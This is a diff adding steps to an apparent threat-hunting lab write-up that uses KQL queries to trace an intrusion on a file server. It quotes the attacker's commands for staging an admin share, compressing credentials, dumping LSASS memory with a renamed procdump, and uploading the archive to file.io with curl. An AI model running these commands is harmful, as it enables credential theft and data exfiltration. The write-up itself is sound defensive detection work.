@@ -172,6 +172,90 @@ DeviceFileEvents
 
 ---
 
+### 9. Searched the `DeviceFileEvents` Table to find the command used to stage data from a network share
+
+The attacker used the command “xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y” to stage the data to from the network share so that they are less likely to trigger security alerts.
+
+**Query used to locate events:**
+
+```kql
+DeviceFileEvents
+| where DeviceName == "azuki-fileserver01" 
+| where InitiatingProcessCommandLine contains "xcopy"
+| where FileName == "IT-Admin-Passwords.csv"
+| project TimeGenerated, DeviceName, FileName, InitiatingProcessCommandLine
+```
+<img width="1212" alt="image" src="https://github.com/user-attachments/assets/dfa7a6d3-fce1-428f-91d7-4551bbade306">
+
+---
+
+### 10. Searched the `DeviceFileEvents` Table to find the command used to compress the staged collection data
+
+The attacker compressed the data using a cross platform tool called “tar”. This is the command the attacker used “"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .”
+
+**Query used to locate events:**
+
+```kql
+DeviceFileEvents
+| where DeviceName == "azuki-fileserver01" 
+| where InitiatingProcessCommandLine contains ".tar"
+| project TimeGenerated, FileName, InitiatingProcessCommandLine
+```
+<img width="1212" alt="image" src="https://github.com/user-attachments/assets/f7bf9883-cda1-4487-8103-d72783bc2098">
+
+---
+
+### 11. Searched the `DeviceFileEvents` Table to find the renamed credential dumping tool
+
+The attacker renamed a credential dumping tool to “pd.exe” as an inconspicuous file name to evade detection.
+
+**Query used to locate events:**
+
+```kql
+DeviceFileEvents
+| where DeviceName == "azuki-fileserver01" 
+| where ActionType == "FileCreated"
+| where FileName endswith ".exe"
+| where FolderPath contains "C:\\Windows\\Logs\\CBS"
+| project TimeGenerated, ActionType, DeviceName, FileName, FolderPath
+```
+<img width="1212" alt="image" src="https://github.com/user-attachments/assets/2fae398b-f148-4fdd-87f2-d7c919bda18b">
+
+---
+
+### 12. Searched the `DeviceFileEvents` Table to find the command used by attacker to dump process memory for credential extraction
+
+The attacker used pd.exe to have a complete process memory dump using the command “"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp”
+
+**Query used to locate events:**
+
+```kql
+DeviceFileEvents
+| where DeviceName == "azuki-fileserver01" 
+| where InitiatingProcessCommandLine contains "pd.exe"
+| project TimeGenerated, ActionType, DeviceName, InitiatingProcessCommandLine
+```
+<img width="1212" alt="image" src="https://github.com/user-attachments/assets/94dbfab6-d100-42ad-a8f4-536976a477b3">
+
+---
+
+### 13. Searched the `DeviceFileEvents` Table to find the command used by attacker to exfiltrate the staged data
+
+The attacker used an outbound HTTP request to upload the compressed archive to an external endpoint. This is the command used by the attacker "curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io. The cloud service used was “file.io”.
+
+**Query used to locate events:**
+
+```kql
+DeviceNetworkEvents
+| where DeviceName == "azuki-fileserver01" 
+| where InitiatingProcessCommandLine contains "curl"
+| where RemotePort == "443"
+| project TimeGenerated, DeviceName,RemotePort, InitiatingProcessCommandLine
+```
+<img width="1212" alt="image" src="https://github.com/user-attachments/assets/6653ad22-343d-4a39-896c-384bf23f433a">
+
+---
+
 
 ## Chronological Event Timeline 
 
